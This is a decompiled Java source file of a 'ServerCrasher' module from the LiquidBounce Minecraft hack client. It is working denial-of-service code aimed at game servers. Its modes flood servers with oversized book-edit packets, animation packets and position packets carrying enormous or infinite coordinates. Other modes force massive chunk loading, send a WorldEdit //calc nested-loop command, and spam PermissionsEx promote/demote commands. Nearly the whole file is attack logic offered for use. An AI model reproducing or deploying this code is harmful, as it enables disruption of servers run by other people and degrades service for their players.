/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  io.netty.buffer.Unpooled
 *  kotlin.TypeCastException
 *  kotlin.jvm.internal.DoubleCompanionObject
 *  org.jetbrains.annotations.Nullable
 */
package net.ccbluex.liquidbounce.features.module.modules.exploit;

import io.netty.buffer.Unpooled;
import java.util.Random;
import kotlin.TypeCastException;
import kotlin.jvm.internal.DoubleCompanionObject;
import net.ccbluex.liquidbounce.api.enums.ItemType;
import net.ccbluex.liquidbounce.api.minecraft.client.entity.IEntityPlayerSP;
import net.ccbluex.liquidbounce.api.minecraft.item.IItemStack;
import net.ccbluex.liquidbounce.api.minecraft.nbt.INBTTagCompound;
import net.ccbluex.liquidbounce.api.minecraft.nbt.INBTTagList;
import net.ccbluex.liquidbounce.api.network.IPacketBuffer;
import net.ccbluex.liquidbounce.event.EventState;
import net.ccbluex.liquidbounce.event.EventTarget;
import net.ccbluex.liquidbounce.event.MotionEvent;
import net.ccbluex.liquidbounce.event.TickEvent;
import net.ccbluex.liquidbounce.event.WorldEvent;
import net.ccbluex.liquidbounce.features.module.Module;
import net.ccbluex.liquidbounce.features.module.ModuleCategory;
import net.ccbluex.liquidbounce.features.module.ModuleInfo;
import net.ccbluex.liquidbounce.utils.MinecraftInstance;
import net.ccbluex.liquidbounce.utils.misc.RandomUtils;
import net.ccbluex.liquidbounce.utils.timer.MSTimer;
import net.ccbluex.liquidbounce.value.ListValue;
import org.jetbrains.annotations.Nullable;

@ModuleInfo(name="ServerCrasher", description="Allows you to crash certain server.", category=ModuleCategory.EXPLOIT)
public final class ServerCrasher
extends Module {
    private final ListValue modeValue = new ListValue("Mode", new String[]{"Book", "Swing", "MassiveChunkLoading", "WorldEdit", "Pex", "CubeCraft", "AACNew", "AACOther", "AACOld"}, "Book");
    private final MSTimer pexTimer = new MSTimer();

    @Override
    public String getTag() {
        return (String)this.modeValue.get();
    }

    @Override
    public void onEnable() {
        IEntityPlayerSP iEntityPlayerSP = MinecraftInstance.mc.getThePlayer();
        if (iEntityPlayerSP == null) {
            return;
        }
        IEntityPlayerSP iEntityPlayerSP2 = iEntityPlayerSP;
        String string = (String)this.modeValue.get();
        int n = 0;
        String string2 = string;
        if (string2 == null) {
            throw new TypeCastException("null cannot be cast to non-null type java.lang.String");
        }
        switch (string2.toLowerCase()) {
            case "aacnew": {
                for (n = 0; n < 9999; ++n) {
                    MinecraftInstance.mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketPlayerPosition(iEntityPlayerSP2.getPosX() + (double)(9412 * n), iEntityPlayerSP2.getEntityBoundingBox().getMinY() + (double)(9412 * n), iEntityPlayerSP2.getPosZ() + (double)(9412 * n), true));
                }
                break;
            }
            case "aacother": {
                for (n = 0; n < 9999; ++n) {
                    MinecraftInstance.mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketPlayerPosition(iEntityPlayerSP2.getPosX() + (double)(500000 * n), iEntityPlayerSP2.getEntityBoundingBox().getMinY() + (double)(500000 * n), iEntityPlayerSP2.getPosZ() + (double)(500000 * n), true));
                }
                break;
            }
            case "aacold": {
                MinecraftInstance.mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketPlayerPosition(DoubleCompanionObject.INSTANCE.getNEGATIVE_INFINITY(), DoubleCompanionObject.INSTANCE.getNEGATIVE_INFINITY(), DoubleCompanionObject.INSTANCE.getNEGATIVE_INFINITY(), true));
                break;
            }
            case "worldedit": {
                iEntityPlayerSP2.sendChatMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}");
                break;
            }
            case "cubecraft": {
                iEntityPlayerSP2.setPosition(iEntityPlayerSP2.getPosX(), iEntityPlayerSP2.getPosY() + 0.3, iEntityPlayerSP2.getPosZ());
                break;
            }
            case "massivechunkloading": {
                for (double d = iEntityPlayerSP2.getPosY(); d < (double)255; d += 5.0) {
                    MinecraftInstance.mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketPlayerPosition(iEntityPlayerSP2.getPosX(), d, iEntityPlayerSP2.getPosZ(), true));
                }
                for (int i = 0; i < 6685; i += 5) {
                    MinecraftInstance.mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketPlayerPosition(iEntityPlayerSP2.getPosX() + (double)i, 255.0, iEntityPlayerSP2.getPosZ() + (double)i, true));
                }
                break;
            }
        }
    }

    @EventTarget
    public final void onWorld(WorldEvent worldEvent) {
        if (worldEvent.getWorldClient() == null) {
            this.setState(false);
        }
    }

    @EventTarget
    public final void onMotion(MotionEvent motionEvent) {
        IEntityPlayerSP iEntityPlayerSP = MinecraftInstance.mc.getThePlayer();
        if (motionEvent.getEventState() == EventState.POST || iEntityPlayerSP == null) {
            return;
        }
        String string = (String)this.modeValue.get();
        int n = 0;
        String string2 = string;
        if (string2 == null) {
            throw new TypeCastException("null cannot be cast to non-null type java.lang.String");
        }
        switch (string2.toLowerCase()) {
            case "book": {
                int n2;
                IItemStack iItemStack = MinecraftInstance.classProvider.createItemStack(MinecraftInstance.classProvider.getItemEnum(ItemType.WRITABLE_BOOK));
                INBTTagCompound iNBTTagCompound = MinecraftInstance.classProvider.createNBTTagCompound();
                iNBTTagCompound.setString("author", RandomUtils.INSTANCE.randomNumber(20));
                iNBTTagCompound.setString("title", RandomUtils.INSTANCE.randomNumber(20));
                INBTTagList iNBTTagList = MinecraftInstance.classProvider.createNBTTagList();
                String string3 = RandomUtils.INSTANCE.randomNumber(600);
                int n3 = 49;
                for (n2 = 0; n2 <= n3; ++n2) {
                    iNBTTagList.appendTag(MinecraftInstance.classProvider.createNBTTagString(string3));
                }
                iNBTTagCompound.setTag("pages", iNBTTagList);
                iItemStack.setTagCompound(iNBTTagCompound);
                n3 = 99;
                for (n2 = 0; n2 <= n3; ++n2) {
                    IPacketBuffer iPacketBuffer = MinecraftInstance.classProvider.createPacketBuffer(Unpooled.buffer());
                    iPacketBuffer.writeItemStackToBuffer(iItemStack);
                    MinecraftInstance.mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketCustomPayload(new Random().nextBoolean() ? "MC|BSign" : "MC|BEdit", iPacketBuffer));
                }
                break;
            }
            case "cubecraft": {
                double d = iEntityPlayerSP.getPosX();
                double d2 = iEntityPlayerSP.getPosY();
                double d3 = iEntityPlayerSP.getPosZ();
                for (int i = 0; i < 3000; ++i) {
                    MinecraftInstance.mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketPlayerPosition(d, d2 + 0.09999999999999, d3, false));
                    MinecraftInstance.mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketPlayerPosition(d, d2, d3, true));
                }
                iEntityPlayerSP.setMotionY(0.0);
                break;
            }
            case "pex": {
                if (!this.pexTimer.hasTimePassed(2000L)) break;
                iEntityPlayerSP.sendChatMessage(new Random().nextBoolean() ? "/pex promote a a" : "/pex demote a a");
                this.pexTimer.reset();
                break;
            }
            case "swing": {
                for (n = 0; n < 5000; ++n) {
                    MinecraftInstance.mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketAnimation());
                }
                break;
            }
            default: {
                this.setState(false);
            }
        }
    }

    @EventTarget
    public final void onTick(@Nullable TickEvent tickEvent) {
        if (MinecraftInstance.mc.getThePlayer() == null || MinecraftInstance.mc.getTheWorld() == null) {
            this.setState(false);
        }
    }
}

